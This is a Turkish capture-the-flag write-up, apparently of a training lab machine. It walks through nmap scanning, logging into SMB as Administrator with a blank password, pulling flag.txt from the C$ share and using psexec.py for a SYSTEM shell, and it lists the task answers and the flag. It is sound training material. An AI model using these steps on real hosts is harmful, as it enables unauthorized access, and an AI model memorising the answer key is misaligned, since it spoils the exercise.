## 1. Keşif

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.220
```

<img width="828" height="512" alt="nmp" src="https://github.com/user-attachments/assets/dd01fa6d-8924-4e6e-8b05-be36efbf933f" />

Tarama sonucunda karşımda klasik bir Windows makinesi profili var: **135 (RPC), 139 (NetBIOS-SSN), 445 (SMB)**. Bu üçlü kombinasyon, doğrudan **SMB (Server Message Block)** üzerinden dosya paylaşımı enumeration'ına yönlendiriyor beni.

---

## 2. SMB Enumeration — Paylaşımların Listelenmesi

İlk olarak anonim (null session) bir bağlantı deniyorum:

```bash
smbclient -L //10.129.184.220 -N
```

<img width="380" height="60" alt="hata" src="https://github.com/user-attachments/assets/63967209-d784-4498-a5cf-4ed589bcdd4a" />

Anonim erişim reddediliyor — yani SMB, kimlik doğrulaması olmadan paylaşım listesini vermiyor. Bu durumda hedefte **`Administrator`** gibi standart/varsayılan bir hesabın var olabileceğini düşünerek onu deniyorum:

```bash
smbclient -L //10.129.184.220 -U Administrator
```

<img width="739" height="210" alt="smbclient" src="https://github.com/user-attachments/assets/7df1bfd5-9ace-4e06-ac4f-c4a0f9753492" />


Şaşırtıcı bir şekilde **boş parola** ile (Enter'a basarak) `Administrator` hesabıyla oturum açabiliyorum ve tüm **Yönetimsel Paylaşımları (Administrative Shares)** görebiliyorum:

- **`ADMIN$`** — Windows kurulum dizinine (`C:\Windows`) erişim sağlayan yönetimsel paylaşım.
- **`C$`** — Sunucunun **tüm C: sürücüsüne** erişim sağlayan, kullanıcıların tüm dosya sistemini görüntülemesine olanak tanıyan yönetimsel paylaşım.
- **`IPC$`** — Süreçler arası iletişim (Inter-Process Communication) için kullanılan özel paylaşım.

Paylaşım adının sonundaki **`$`** karakteri, o paylaşımın gizli bir **yönetimsel paylaşım (administrative share)** olduğunu gösteriyor — normal dosya gezgininde görünmez, sadece tam yolunu bilen ve yeterli yetkiye sahip biri erişebilir.

---

## 3. C$ Paylaşımı Üzerinden Dosya Sistemine Erişim

`C$` paylaşımı bana sunucunun **tüm dosya sistemine** erişim imkânı verdiği için, doğrudan bu paylaşıma bağlanıyorum:

```bash
smbclient //10.129.184.220/C$ -U Administrator
```

Boş parola ile giriş yapıp `ls` komutuyla kök dizini listeliyorum:

<img width="615" height="289" alt="1" src="https://github.com/user-attachments/assets/ee2a833c-c6c0-4182-a67d-92aeb12e076d" />


Standart bir Windows dizin yapısı görüyorum. Kullanıcı profillerinin bulunduğu `Users` dizinine yöneliyorum:

```
smb: \> cd Users
smb: \Users\> ls
  Administrator                       D        0  Wed Apr 21 11:23:32 2021
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  Default                           DHR        0  Wed Apr 21 11:17:12 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  Public                             DR        0  Wed Apr 21 11:23:31 2021
```

`Administrator` klasörüne giriyorum ve masaüstünü kontrol ediyorum:

<img width="611" height="111" alt="2" src="https://github.com/user-attachments/assets/26ff10f6-1ca4-4902-8d96-e509612fc63b" />

```
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit
```
<img width="981" height="52" alt="3" src="https://github.com/user-attachments/assets/ea863f32-7411-48ca-8682-30739c2dcf34" />

Dosya kendi Kali makineme indi. Şimdi rahatça okuyabilirim:

```bash
cat flag.txt
```

```
f751c19eda8f61ce81827e6930a1f40c
```

<img width="346" height="62" alt="flag" src="https://github.com/user-attachments/assets/bb80535f-7785-42cc-9780-ac08407777e4" />

Flag başarıyla elde edildi. 🎉

---

## 4.Interaktif Shell İhtimali

Elimde `Administrator` kimlik bilgileri (boş parola) ve `C$` paylaşımına tam erişim olduğu için, aslında burada durmak zorunda değilim. **Impacket** araç setinin parçası olan **`psexec.py`** kullanılarak hedef üzerinde tam interaktif bir shell (SYSTEM yetkisiyle) de elde edilebilir:

```bash
psexec.py Administrator@10.129.184.220
```

`psexec.py`, SMB üzerinden hedef sisteme bir servis binary'si yükleyip çalıştırarak (klasik Sysinternals PsExec mantığıyla) uzaktan komut satırı erişimi sağlıyor. Bu makinede flag'e ulaşmak için buna gerek kalmadı, ancak ortamda daha fazla post-exploitation yapılması gerekseydi bu araç bir sonraki doğal adım olurdu.

---

## 6. Görev Soruları ve Cevapları

**Görev 1 — Windows güvenlik duvarı ping ICMP paketlerimizi engellediğinde makineleri listelemek için hangi Nmap anahtarını kullanabiliriz?**
`-Pn`

**Görev 2 — Üç harfli SMB kısaltması ne anlama geliyor?**
`Server Message Block`

**Görev 3 — SMB varsayılan olarak hangi bağlantı noktasından dinleme yapar?**
`445`

**Görev 4 — `smbclient` kullanılabilir paylaşımları listelemek için hangi komut satırı argümanını veriyorsunuz?**
`-L`

**Görev 5 — Bir hisse senedi adının sonundaki hangi karakter, o hisse senedinin yönetimsel bir hisse senedi olduğunu gösterir?**
`$`

**Görev 6 — Kullanıcıların tüm dosya sistemini görüntülemesine olanak tanıyan sunucuda hangi Yönetimsel paylaşım klasörüne erişilebilir?**
`C$`

**Görev 7 — SMB paylaşımında bulduğumuz dosyaları indirmek için hangi komutu kullanabiliriz?**
`get`

**Görev 8 — Impacket koleksiyonunun parçası olan hangi araç, sistemde etkileşimli bir kabuk elde etmek için kullanılabilir?**
`psexec.py`

**Tek Bayrak Gönder — Yöneticinin masaüstünde bulunan bayrağı gönderin.**
`f751c19eda8f61ce81827e6930a1f40c`
